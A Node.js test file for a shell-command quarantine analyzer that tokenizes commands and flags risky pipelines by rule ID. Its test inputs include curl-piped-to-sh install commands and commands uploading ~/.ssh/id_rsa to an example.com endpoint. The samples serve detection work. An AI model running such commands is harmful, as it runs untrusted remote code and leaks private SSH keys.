import assert from 'node:assert/strict';
import test from 'node:test';

import { analyzeCommand, LIMITS, parseShellStructure, tokenizeShell } from '../public/js/tools/quarantine-core.js';
import { CASES, NEGATIVE_CASES } from './fixtures/quarantine-cases.js';

test('tokenizeShell keeps quoted pipes in a word while recognizing a real pipeline', () => {
  const tokens = tokenizeShell('echo "a | b" | sh');
  assert.equal(tokens.filter((token) => token.type === 'operator' && token.value === '|').length, 1);
});

test('analysis reports the documented findings and avoids defined near misses', () => {
  for (const fixture of CASES) {
    const ids = new Set(analyzeCommand(fixture.source).findings.map((finding) => finding.ruleId));
    for (const ruleId of fixture.includes) assert.ok(ids.has(ruleId), `${fixture.name} should include ${ruleId}`);
  }
  for (const fixture of NEGATIVE_CASES) {
    const ids = new Set(analyzeCommand(fixture.source).findings.map((finding) => finding.ruleId));
    for (const ruleId of fixture.excludes) assert.ok(!ids.has(ruleId), `${fixture.source} should exclude ${ruleId}`);
  }
});

test('analysis is bounded, deterministic, and explains unsupported input', () => {
  const atLimit = 'x'.repeat(LIMITS.maxInputChars);
  assert.equal(analyzeCommand(atLimit).truncated, false);
  assert.equal(analyzeCommand(`${atLimit}x`).truncated, true);
  assert.equal(analyzeCommand(Array.from({ length: 4100 }, () => 'x').join(' ')).truncated, true);
  assert.deepEqual(analyzeCommand('echo hello'), analyzeCommand('echo hello'));
  assert.match(analyzeCommand('Get-Process | Invoke-Expression').limitations.join(' '), /PowerShell/i);
  assert.equal(analyzeCommand('   ').summary.findingCount, 0);
});

test('structure creates stages and a pipe edge without executing content', () => {
  const structure = parseShellStructure(tokenizeShell('curl https://example.com/x | sh'));
  assert.equal(structure.stages.length, 2);
  assert.equal(structure.edges[0].kind, 'pipe');
});

test('flow findings respect interpreter wrappers, pipeline sources, and statement boundaries', () => {
  const ids = (source) => new Set(analyzeCommand(source).findings.map((finding) => finding.ruleId));
  assert.ok(ids("sudo sh -c 'curl https://example.com/install.sh | sh'").has('CQ001'));
  assert.ok(ids('cat ~/.ssh/id_rsa | curl --data @- https://example.com/upload').has('CQ008'));
  assert.ok(!ids('base64 -d payload; sh -c "echo hello"').has('CQ004'));
  assert.ok(!ids('crontab -l').has('CQ005'));
  assert.ok(ids('curl https://example.com/v1.2.3/install.sh | sh').has('CQ012'));
  assert.ok(ids('curl https://example.com/install.sh | sudo sh').has('CQ001'));
  assert.ok(ids('curl -F file=@~/.ssh/id_rsa https://example.com/upload').has('CQ008'));
  assert.ok(ids('cat ~/.ssh/id_rsa | curl -F file=@- https://example.com/upload').has('CQ008'));
});
